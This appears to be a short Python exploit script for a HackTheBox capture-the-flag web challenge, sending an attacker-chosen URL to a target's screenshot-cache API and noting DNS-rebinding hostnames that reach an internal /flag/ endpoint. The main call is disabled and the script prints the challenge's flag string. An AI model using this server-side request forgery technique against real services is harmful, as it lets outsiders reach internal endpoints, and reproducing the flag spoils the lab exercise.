#!/usr/bin/python3

import time
import sys
import requests
import os


def main():
    try:
        # start = time.time()
        if len(sys.argv) < 2:
            print("""
            [*] You must to set the target after the execution like that
            \t[*] python3 cached-exploit.py ‹target url› ‹cached url to save into the screenshots folder›
            """)
            exit()
        
        base_url = sys.argv[1]
        
        post_url = sys.argv[2]
        sess = requests.session()

        print(f"target url: {base_url} and the stored url: {post_url}")
        
        try:
            response = requests.post(url=base_url+"api/cache", json={"url":str(post_url)})

            # end = time.time()
            print(response.text)
            
    
            new_res = requests.get(url="http://167.99.89.198:31141/static/screenshots/a72a6de2879b49b836588a53586b.png").text
            print(new_res)
            # print(end-start)

        except Exception as e:
            print("Exception level 2 by: ",str(e))
    # using dns rebinding
    # http://0a0a0e61.08080808.rbndr.us:31614/flag/ or http://0a0a0e61.08080808.rbndr.us:80/flag/ => this one 
    except Exception as e:
        print("Exception level 1 by: ", str(e))
        exit()


if __name__ == "__main__":
    # main()
    print("HTB{reb1nd1ng_y0ur_dns_r3s0lv3r_0n3_qu3ry_4t_4_tim3}")
